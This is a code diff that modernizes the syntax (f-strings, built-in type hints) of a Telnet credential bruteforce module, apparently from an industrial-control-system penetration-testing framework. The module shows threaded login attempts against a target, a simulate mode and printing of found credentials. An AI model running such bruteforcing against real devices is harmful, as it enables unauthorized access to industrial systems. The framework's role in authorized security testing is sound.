@@ -40,7 +40,6 @@ import telnetlib
 import threading
 import time
 from pathlib import Path
-from typing import List, Optional, Tuple
 
 from industrialxpl.core.exploit import (
     Exploit as _Exploit,
@@ -80,7 +79,7 @@ _FAILURE_INDICATORS = [b"Incorrect", b"incorrect", b"failed", b"Failed",
                        b"denied", b"invalid", b"Invalid", b"error", b"Error"]
 
 
-def _load_wordlist(path_or_list: str, default: List[str]) -> List[str]:
+def _load_wordlist(path_or_list: str, default: list[str]) -> list[str]:
     """Load a wordlist from file path, file:// URI, or return default list."""
     val = path_or_list.strip()
     if not val:
@@ -98,7 +97,7 @@ def _load_wordlist(path_or_list: str, default: List[str]) -> List[str]:
                 if line.strip() and not line.startswith("#")
             ]
     except OSError as exc:
-        print_warning("[Telnet BF] Cannot open wordlist {}: {}".format(fpath, exc))
+        print_warning(f"[Telnet BF] Cannot open wordlist {fpath}: {exc}")
         return default
 
 
@@ -211,11 +210,8 @@ class Exploit(_Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would bruteforce {}:{}/Telnet with {} username(s) x {} password(s) "
-                    "= {} combinations using {} threads.".format(
-                        self.target, self.port,
-                        len(usernames), len(passwords), total, self.threads,
-                    )
+                    f"Would bruteforce {self.target}:{self.port}/Telnet with {len(usernames)} username(s) x {len(passwords)} password(s) "
+                    f"= {total} combinations using {self.threads} threads."
                 ),
                 mitre_techniques=["T0859", "T0822"],
             )
@@ -226,14 +222,12 @@ class Exploit(_Exploit):
             tn = telnetlib.Telnet(self.target, self.port, timeout=float(self.timeout))
             tn.close()
         except Exception as exc:
-            print_error("[Telnet BF] Cannot connect to {}:{}: {}".format(self.target, self.port, exc))
+            print_error(f"[Telnet BF] Cannot connect to {self.target}:{self.port}: {exc}")
             return
 
-        print_status("[Telnet BF] Starting bruteforce against {}:{} ({} combinations, {} threads)".format(
-            self.target, self.port, total, self.threads
-        ))
+        print_status(f"[Telnet BF] Starting bruteforce against {self.target}:{self.port} ({total} combinations, {self.threads} threads)")
 
-        found: List[Tuple[str, int, str, str]] = []
+        found: list[tuple[str, int, str, str]] = []
         work_queue: queue.Queue = queue.Queue()
         stop_event = threading.Event()
 
@@ -251,9 +245,7 @@ class Exploit(_Exploit):
                 )
                 if success:
                     found.append((self.target, self.port, username, password))
-                    print_success("[Telnet BF] Valid credentials: user='{}' pass='{}'".format(
-                        username, password
-                    ))
+                    print_success(f"[Telnet BF] Valid credentials: user='{username}' pass='{password}'")
                     if self.stop_on_success:
                         stop_event.set()
                 work_queue.task_done()
@@ -268,7 +260,7 @@ class Exploit(_Exploit):
             t.join()
 
         if found:
-            print_success("[Telnet BF] Bruteforce complete - {} valid credential(s) found.".format(len(found)))
+            print_success(f"[Telnet BF] Bruteforce complete - {len(found)} valid credential(s) found.")
             print_table(("Target", "Port", "Username", "Password"), *found)
         else:
             print_error("[Telnet BF] No valid credentials found.")
